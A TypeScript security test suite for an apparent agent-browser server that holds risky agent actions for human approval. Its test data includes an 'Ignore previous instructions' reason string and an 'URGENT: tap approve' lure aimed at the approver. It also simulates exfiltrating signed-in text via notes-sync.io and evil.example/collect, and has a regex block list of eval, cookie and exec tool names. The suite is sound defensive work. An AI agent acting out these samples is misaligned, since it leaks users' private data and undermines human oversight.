// SPDX-License-Identifier: AGPL-3.0-only
// Named security tests (AGENTS.md rule 2), against the server with a fake browser.
import { describe, test, beforeEach, afterEach } from "node:test";
import assert from "node:assert/strict";
import { ROUTES, TOOLS } from "@crossbar/shared";
import { startTestApp, sleep, type FakeTab, type FakePool } from "./helpers.ts";
import { HUMAN_ONLY, mcpTools } from "../src/capabilities.ts";
import { UNUSED_REVOKE_MS } from "../src/tokens.ts";
import { classify, carriesData } from "../src/agent.ts";

type T = Awaited<ReturnType<typeof startTestApp>>;

describe("route table", () => {
  test("every route declares its login type", () => {
    for (const r of ROUTES) assert.ok(["public", "session", "token", "either"].includes(r.auth), `${r.method} ${r.path}`);
  });
  test("every route has a handler and every handler has a route", async () => {
    const t = await startTestApp();
    const routeKeys = new Set(ROUTES.map((r) => `${r.method} ${r.path}`));
    const handlerKeys = new Set(Object.keys(t.app.handlers));
    // Auth routes are provided by auth/ (fake here).
    const authRoutes = [...routeKeys].filter((k) => /\/api\/(setup|login|logout|me|passkey|users)\b/.test(k));
    for (const k of routeKeys) if (!authRoutes.includes(k)) assert.ok(handlerKeys.has(k), `no handler for ${k}`);
    for (const k of handlerKeys) assert.ok(routeKeys.has(k), `handler without a route: ${k}`);
    await t.close();
  });
  test("public routes are only the ones that must be", () => {
    const pub = ROUTES.filter((r) => r.auth === "public").map((r) => `${r.method} ${r.path}`);
    assert.deepEqual(pub.sort(), [
      "GET /",
      "GET /api/openapi.json",
      "GET /api/setup",
      "GET /assets/:file",
      "GET /healthz",
      "POST /api/login",
      "POST /api/passkey/login/options",
      "POST /api/passkey/login/verify",
      "POST /api/setup",
      "POST /api/tickets/:id/deny-link",
    ].sort());
  });
  test("approving is never possible with a token", () => {
    for (const r of ROUTES.filter((r) => /approve|claim|done|input|resume|tokens|notifications|users/.test(r.path))) assert.equal(r.auth, "session", `${r.method} ${r.path}`);
  });
});

describe("human-only list", () => {
  test("no human-only action is an MCP tool", () => {
    const names = mcpTools().map((t) => t.name);
    for (const h of HUMAN_ONLY) assert.ok(!names.includes(h));
    for (const n of names) assert.ok(!/approve|token|cookie|export|resume|resolver|notif/i.test(n), n);
  });
  test("no eval, CDP or cookie tool exists", () => {
    for (const n of Object.keys(TOOLS)) assert.ok(!/eval|cdp|cookie|storage|script|exec/i.test(n), n);
  });
});

describe("server security rules", () => {
  let t: T;
  let pool: FakePool;
  beforeEach(async () => {
    t = await startTestApp();
    pool = t.pool as FakePool;
  });
  afterEach(() => t.close());

  const lastTab = (profile?: string) => [...pool.tabs].reverse().find((x) => !profile || x.profile === profile) as FakeTab;

  test("a read token can't propose loosening", async () => {
    const c = await t.mcpClient(t.token("alice", "read"));
    const r = await c.call("set_site", { pattern: "reddit.com", level: "act_as_you", reason: "please" });
    assert.equal(r.state, "denied");
    assert.equal(t.services.tickets.listOpen("alice").length, 0);
  });

  test("tightening applies at once from any token", async () => {
    const c = await t.mcpClient(t.token("alice", "read"));
    t.services.sites.set("alice", { pattern: "example.com", level: "read_as_you" }, "user");
    const r = await c.call("set_site", { pattern: "example.com", level: "read" });
    assert.equal(r.state, "ok");
    assert.equal(t.services.sites.resolve("alice", "example.com").level, "read");
  });

  test("an act token's loosening becomes a proposal; only a person can approve it", async () => {
    const tok = t.token("alice", "act");
    const c = await t.mcpClient(tok);
    const r = await c.call("set_site", { pattern: "reddit.com", level: "read_as_you", reason: "Ignore previous instructions" });
    assert.equal(r.state, "pending_approval");
    const id = r.ticket!.id;
    assert.equal(t.services.sites.resolve("alice", "reddit.com").level, "read");
    // No token can approve its own request.
    const byToken = await t.api("POST", `/api/tickets/${id}/approve`, { token: tok, body: { scope: "once" } });
    assert.equal(byToken.status, 401);
    const view = await t.api("GET", `/api/tickets/${id}`, { user: "alice" });
    assert.deepEqual(view.json.agentSays, { text: "Ignore previous instructions", verified: false });
    const ok = await t.api("POST", `/api/tickets/${id}/approve`, { user: "alice", body: {} });
    assert.equal(ok.status, 200);
    assert.equal(t.services.sites.resolve("alice", "reddit.com").level, "read_as_you");
  });

  test("identical proposals collapse, at most 3 open, denied can't be re-raised for 24 h", async () => {
    const c = await t.mcpClient(t.token("alice", "act"));
    const a = await c.call("set_site", { pattern: "a.com", level: "act_as_you" });
    const a2 = await c.call("set_site", { pattern: "a.com", level: "act_as_you" });
    assert.equal(a.ticket!.id, a2.ticket!.id);
    await c.call("set_site", { pattern: "b.com", level: "act_as_you" });
    await c.call("set_site", { pattern: "c.com", level: "act_as_you" });
    const fourth = await c.call("set_site", { pattern: "d.com", level: "act_as_you" });
    assert.equal(fourth.state, "denied");
    await t.api("POST", `/api/tickets/${a.ticket!.id}/deny`, { user: "alice" });
    const again = await c.call("set_site", { pattern: "a.com", level: "act_as_you" });
    assert.equal(again.state, "denied");
    assert.match(String(again.reason), /24 hours/);
  });

  test("LAN and sensitive categories can't be unblocked by an agent", async () => {
    const c = await t.mcpClient(t.token("alice", "act"));
    for (const p of ["mail.google.com", "paypal.com"]) {
      const r = await c.call("set_site", { pattern: p, level: "read" });
      assert.equal(r.state, "denied", p);
    }
    const lan = await c.call("open", { url: "http://192.168.1.1/" });
    assert.equal(lan.state, "denied");
    const local = await c.call("open", { url: "http://router.lan/" });
    assert.equal(local.state, "denied");
  });

  test("the app's own UI is blocked for agents", async () => {
    const c = await t.mcpClient(t.token("alice"));
    assert.equal((await c.call("open", { url: "http://crossbar.test/#/tickets" })).state, "denied");
  });

  test("non-GET requests are held, and a person's approval releases them", async () => {
    pool.pages.set("https://forum.example/t/1", { title: "Thread", content: "hi", onClick: { e5: { method: "POST", url: "https://forum.example/api/comment", resourceType: "XHR", postData: "body=hello+world", hasPostData: true } } });
    const c = await t.mcpClient(t.token("alice", "act"));
    await c.call("open", { url: "https://forum.example/t/1" });
    await c.call("type", { ref: "e4", text: "hello world" });
    const r = await c.call("click", { ref: "e5" });
    assert.equal(r.state, "pending_approval");
    const tab = lastTab();
    const held = tab.results.find((x) => x.verdict === "hold")!;
    assert.equal(held.rule, "comment");
    const view = await t.api("GET", `/api/tickets/${r.ticket!.id}`, { user: "alice" });
    const facts = view.json.facts as { fields: Array<{ key: string; typedByAgent: boolean }>; method: string };
    assert.equal(facts.method, "POST");
    assert.ok(facts.fields.find((f) => f.key === "body")?.typedByAgent, "agent-typed text not highlighted");
    await t.api("POST", `/api/tickets/${r.ticket!.id}/approve`, { user: "alice", body: { scope: "task" } });
    await sleep(50);
    assert.equal(held.outcome, "released");
    // "For this task" covers the next comment on the same site.
    const again = tab.simulate({ method: "POST", url: "https://forum.example/api/comment", resourceType: "XHR", postData: "body=second" });
    assert.equal(again.verdict, "allow");
  });

  test("deny fails the held request", async () => {
    pool.pages.set("https://forum.example/", { onClick: { e1: { method: "POST", url: "https://forum.example/vote", resourceType: "XHR" } } });
    const c = await t.mcpClient(t.token("alice", "act"));
    await c.call("open", { url: "https://forum.example/" });
    const r = await c.call("click", { ref: "e1" });
    await t.api("POST", `/api/tickets/${r.ticket!.id}/deny`, { user: "alice" });
    await sleep(50);
    assert.equal(lastTab().results.find((x) => x.verdict === "hold")!.outcome, "failed");
  });

  test("a read token can't act: writes are refused, not held", async () => {
    pool.pages.set("https://forum.example/", { onClick: { e1: { method: "POST", url: "https://forum.example/api/comment", resourceType: "XHR" } } });
    const c = await t.mcpClient(t.token("alice", "read"));
    await c.call("open", { url: "https://forum.example/" });
    await c.call("click", { ref: "e1" });
    await sleep(50);
    const r = lastTab().results.find((x) => x.req.method === "POST")!;
    assert.equal(r.verdict, "deny");
    assert.equal(r.rule, "read_token_cannot_act");
  });

  test("irreversible classes always ask, even with an 'always' grant", async () => {
    const tok = t.token("alice", "act");
    const c = await t.mcpClient(tok);
    pool.pages.set("https://shop.example/", { onClick: { e1: { method: "POST", url: "https://shop.example/checkout/pay", resourceType: "XHR" } } });
    await c.call("open", { url: "https://shop.example/" });
    const r = await c.call("click", { ref: "e1" });
    const view = await t.api("GET", `/api/tickets/${r.ticket!.id}`, { user: "alice" });
    assert.deepEqual(view.json.scopes, ["once"]);
    await t.api("POST", `/api/tickets/${r.ticket!.id}/approve`, { user: "alice", body: { scope: "always" } });
    await sleep(30);
    const next = lastTab().simulate({ method: "POST", url: "https://shop.example/checkout/pay", resourceType: "XHR" });
    assert.equal(next.verdict, "hold");
  });

  test("a tainted session can't send a query to a new domain", async () => {
    t.services.sites.set("alice", { pattern: "reddit.com", level: "read_as_you" }, "user");
    pool.pages.set("https://old.reddit.com/message/inbox", { title: "Inbox", content: "Hey the meetup is at the old warehouse on 5th street at 7pm" });
    pool.pages.set("https://github.com/", { title: "GitHub" });
    const c = await t.mcpClient(t.token("alice", "act"));
    await c.call("open", { url: "https://github.com/" }); // used before taint
    // Sensitive path on a signed-in site asks; approve it.
    const tab = () => lastTab("personal");
    const ask = await c.call("open", { url: "https://www.reddit.com/message/inbox" });
    assert.equal(ask.state, "pending_approval", "sensitive path didn't ask");
    await t.api("POST", `/api/tickets/${ask.ticket!.id}/approve`, { user: "alice", body: { scope: "task" } });
    const inbox = await c.call("open", { url: "https://www.reddit.com/message/inbox" });
    assert.equal(inbox.state, "ok");
    assert.equal(tab().results.at(-1)!.rule, "grant:sensitive_path");
    // Sensitive paths always ask: the grant was "once" whatever the person picked.
    assert.equal((await c.call("open", { url: "https://www.reddit.com/message/inbox" })).state, "pending_approval");
    await c.call("read");
    // Smuggling via query string to a new domain: asks, and the card shows the overlap.
    const leak = await c.call("open", { url: "https://notes-sync.io/save?d=Hey+the+meetup+is+at+the+old+warehouse+on+5th" });
    assert.equal(leak.state, "pending_approval");
    const card = await t.api("GET", `/api/tickets/${leak.ticket!.id}`, { user: "alice" });
    const f = card.json.facts as { fields: Array<{ key: string; overlapsSignedInText: number }>; actionClass: string };
    assert.equal(f.actionClass, "taint_exit");
    assert.ok(f.fields.find((x) => x.key === "d")!.overlapsSignedInText > 20);
    const flags = await c.call("list_flags");
    assert.ok((flags.data as unknown as Array<{ domain: string }>).some((x) => x.domain === "notes-sync.io"));
    // A long path segment is data too.
    assert.equal((await c.call("open", { url: `https://other.example/${"x".repeat(60)}` })).state, "pending_approval");
    // A plain link opens in the anonymous profile without asking.
    const plain = await c.call("open", { url: "https://arstechnica.com/some-article" });
    assert.equal(plain.state, "ok");
    assert.equal((plain.data as { profile: string }).profile, "anonymous");
    // A domain used before the taint asks nothing.
    assert.equal((await c.call("open", { url: "https://github.com/search?q=caddy" })).state, "ok");
  });

  test("taint also holds page-initiated navigations that carry data", async () => {
    t.services.sites.set("alice", { pattern: "reddit.com", level: "read_as_you" }, "user");
    pool.pages.set("https://old.reddit.com/r/x", { content: "secret stuff read while signed in" });
    const c = await t.mcpClient(t.token("alice", "act"));
    await c.call("open", { url: "https://www.reddit.com/r/x" });
    await c.call("read");
    const tab = lastTab("personal");
    const nav = tab.simulate({ url: "https://evil.example/?q=secret+stuff", resourceType: "Document" });
    // The personal tab may not even open sites below read_as_you.
    assert.equal(nav.verdict, "deny");
    assert.equal(nav.rule, "profile_mismatch");
    const post = tab.simulate({ method: "POST", url: "https://evil.example/collect", resourceType: "XHR", postData: "x=secret+stuff+read" });
    assert.equal(post.verdict, "hold");
    assert.equal(post.rule, "taint_exit");
  });

  test("activity records data shapes, not values; agents see only their own rows", async () => {
    pool.pages.set("https://forum.example/", { onClick: { e1: { method: "POST", url: "https://forum.example/api/comment?draft=1", resourceType: "XHR", postData: JSON.stringify({ text: "my secret reply", n: 3 }) } } });
    const tokA = t.token("alice", "act", "agent-a");
    const a = await t.mcpClient(tokA);
    const b = await t.mcpClient(t.token("alice", "read", "agent-b"));
    await a.call("open", { url: "https://forum.example/" });
    await a.call("click", { ref: "e1" });
    await b.call("open", { url: "https://forum.example/" });
    const rows = (await a.call("list_activity")).data as unknown as Array<Record<string, unknown>>;
    const post = rows.find((r) => r.method === "POST")!;
    assert.ok(post, "POST not logged");
    const json = JSON.stringify(rows);
    assert.ok(!json.includes("my secret reply"));
    const shapes = post.shapes as Array<{ key: string; type: string; length: number }>;
    assert.deepEqual(shapes.find((s) => s.key === "text"), { ...shapes.find((s) => s.key === "text"), type: "text", length: 15 });
    assert.ok(rows.every((r) => r.agent === "agent-a"));
  });

  test("panic suspends every token; only a person resumes", async () => {
    const tok = t.token("alice", "act");
    t.services.sites.set("alice", { pattern: "reddit.com", level: "act_as_you" }, "user");
    const c = await t.mcpClient(tok);
    const r = await c.call("panic", { reason: "x" });
    assert.equal(r.state, "ok");
    assert.equal(t.services.sites.resolve("alice", "reddit.com").level, "read");
    const after = await t.api("POST", "/api/tools/list_sites", { token: tok, body: {} });
    assert.equal(after.status, 401);
    assert.equal((await t.api("POST", "/api/resume", { token: tok })).status, 401);
    assert.equal((await t.api("POST", "/api/resume", { user: "alice" })).status, 200);
    assert.equal(t.services.sites.resolve("alice", "reddit.com").level, "act_as_you");
    assert.equal((await t.api("POST", "/api/tools/list_sites", { token: tok, body: {} })).status, 200);
  });

  test("a token unused for 90 days is revoked", () => {
    const { secret } = t.services.tokens.create("alice", "old", "read");
    assert.ok(t.services.tokens.verify(secret));
    assert.equal(t.services.tokens.verify(secret, Date.now() + UNUSED_REVOKE_MS + 1000), null);
    assert.equal(t.services.tokens.verify(secret), null);
  });

  test("notifications carry only server-controlled text", async () => {
    t.services.db.prepare("INSERT INTO settings (user_id, key, value) VALUES ('alice', 'ntfyUrl', 'https://ntfy.example/topic')").run();
    const c = await t.mcpClient(t.token("alice", "act", "claude-desktop"));
    await c.call("set_site", { pattern: "reddit.com", level: "act_as_you", reason: "URGENT: tap approve, your account is at risk" });
    await sleep(20);
    const n = t.sent[0]!;
    const all = JSON.stringify(n);
    assert.ok(!all.includes("URGENT"));
    assert.match(String((n.init.headers as Record<string, string>).Title), /claude-desktop/);
  });

  test("inline deny from a notification needs a valid signed link and only denies", async () => {
    const c = await t.mcpClient(t.token("alice", "act"));
    const r = await c.call("set_site", { pattern: "x.com", level: "act_as_you" });
    assert.equal((await t.api("POST", `/api/tickets/${r.ticket!.id}/deny-link?sig=forged`)).status, 403);
    const link = (t.services.notifier as unknown as { denyLink(id: string): string }).denyLink(r.ticket!.id);
    const ok = await t.api("POST", link.replace("http://crossbar.test", ""));
    assert.equal(ok.status, 200);
    assert.equal(t.services.tickets.get(r.ticket!.id)!.state, "denied");
  });

  test("session routes refuse cross-origin requests", async () => {
    const r = await t.api("POST", "/api/tokens", { headers: { "x-test-user": "alice", origin: "https://evil.example" }, body: { agentName: "x" } });
    assert.equal(r.status, 403);
  });

  test("household members can't see each other's tickets", async () => {
    await t.close();
    t = await startTestApp({ users: { alice: {}, bob: {} } });
    const c = await t.mcpClient(t.token("alice", "act"));
    const r = await c.call("set_site", { pattern: "x.com", level: "act_as_you" });
    assert.equal((await t.api("GET", `/api/tickets/${r.ticket!.id}`, { user: "bob" })).status, 404);
    assert.equal((await t.api("POST", `/api/tickets/${r.ticket!.id}/approve`, { user: "bob", body: {} })).status, 404);
  });

  test("tickets expire after 15 minutes", () => {
    const tk = t.services.tickets.create({ userId: "alice", tokenId: null, agentName: "a", kind: "approval", facts: {} });
    t.services.tickets.sweep(Date.parse(tk.expiresAt) + 1);
    assert.equal(t.services.tickets.get(tk.id)!.state, "expired");
    assert.equal(Date.parse(tk.expiresAt) - Date.parse(tk.createdAt), 15 * 60 * 1000);
  });
});

describe("challenges (ADR 0001)", () => {
  test("a login wall becomes a ticket; takeover in the personal profile; the verifier decides", async () => {
    const t = await startTestApp();
    const pool = t.pool as FakePool;
    pool.pages.set("https://www.reddit.com/login/", { title: "Log in", facts: { hasPasswordField: true, textLength: 300 } });
    const c = await t.mcpClient(t.token("alice", "read"));
    const r = await c.call("open", { url: "https://www.reddit.com/login/" });
    assert.equal(r.state, "blocked");
    const id = r.ticket!.id;
    // The agent is paused while a person has control.
    const claim = await t.api("POST", `/api/tickets/${id}/claim`, { user: "alice" });
    assert.equal(claim.status, 200);
    const personal = pool.tabs.find((x) => x.profile === "personal")!;
    assert.equal(personal.device, "mobile");
    assert.equal((await c.call("read")).state, "blocked");
    await t.api("POST", `/api/tickets/${id}/input`, { user: "alice", body: { type: "insertText", text: "hunter2" } });
    assert.deepEqual(personal.inputs[0], { type: "insertText", text: "hunter2" });
    // Still a login page: the verifier says no and the ticket reopens.
    const notYet = await t.api("POST", `/api/tickets/${id}/done`, { user: "alice" });
    assert.equal(notYet.json.verified, false);
    assert.equal(t.services.tickets.get(id)!.state, "open");
    await t.api("POST", `/api/tickets/${id}/claim`, { user: "alice" });
    personal.url = "https://www.reddit.com/";
    const done = await t.api("POST", `/api/tickets/${id}/done`, { user: "alice" });
    assert.equal(done.json.verified, true);
    assert.equal(t.services.tickets.get(id)!.state, "resolved");
    // Logging in through a ticket is the opt-in to "read as you".
    assert.equal(t.services.sites.resolve("alice", "reddit.com").level, "read_as_you");
    const w = await c.call("wait_for_ticket", { ticket: id, timeoutSeconds: 1 });
    assert.equal((w.data as { state: string }).state, "resolved");
    await t.close();
  });

  test("challenges can't be approved, only resolved through takeover", async () => {
    const t = await startTestApp();
    const tk = t.services.tickets.create({ userId: "alice", tokenId: null, agentName: "a", kind: "challenge", facts: {} });
    assert.equal((await t.api("POST", `/api/tickets/${tk.id}/approve`, { user: "alice", body: {} })).status, 400);
    await t.close();
  });
});

describe("classification", () => {
  test("classifies by what leaves the browser", () => {
    assert.equal(classify("POST", "https://shop.example/checkout"), "pay");
    assert.equal(classify("DELETE", "https://x.example/api/post/1"), "delete");
    assert.equal(classify("POST", "https://x.example/settings/password"), "credentials");
    assert.equal(classify("POST", "https://x.example/oauth/authorize"), "oauth");
    assert.equal(classify("POST", "https://x.example/api/v1/vote"), "vote");
    assert.equal(classify("POST", "https://x.example/api/x", undefined, "CreateComment"), "comment");
    assert.equal(classify("POST", "https://x.example/api/x"), "write");
  });
  test("carriesData", () => {
    assert.equal(carriesData("https://a.example/article"), false);
    assert.equal(carriesData("https://a.example/a?b=1"), true);
    assert.equal(carriesData(`https://a.example/${"y".repeat(41)}`), true);
  });
});

describe("MCP", () => {
  test("initialize, tools/list and tools/call over streamable HTTP", async () => {
    const t = await startTestApp();
    const c = await t.mcpClient(t.token("alice"));
    assert.ok(c.sessionId);
    const list = await c.rpc("tools/list");
    const tools = (list.result!.tools as Array<{ name: string; inputSchema: { type: string } }>).map((x) => x.name);
    assert.ok(tools.includes("open") && tools.includes("wait_for_ticket") && tools.includes("flag_domain"));
    const bad = await c.rpc("tools/call", { name: "open", arguments: { url: "not a url" } });
    assert.equal((bad.result!.structuredContent as { state: string }).state, "error");
    // Unknown session id must re-initialize.
    const r = await fetch(`${t.base}/mcp`, { method: "POST", headers: { "content-type": "application/json", authorization: `Bearer ${t.token("alice")}`, "mcp-session-id": "nope" }, body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "tools/list" }) });
    assert.equal(r.status, 404);
    // No token, no MCP.
    assert.equal((await fetch(`${t.base}/mcp`, { method: "POST", body: "{}" })).status, 401);
    await t.close();
  });
  test("OpenAPI is generated from the contract", async () => {
    const t = await startTestApp();
    const doc = (await t.api("GET", "/api/openapi.json")).json as unknown as { paths: Record<string, unknown> };
    assert.ok(doc.paths["/api/tools/open"]);
    assert.ok(doc.paths["/api/tickets/{id}/approve"]);
    await t.close();
  });
});
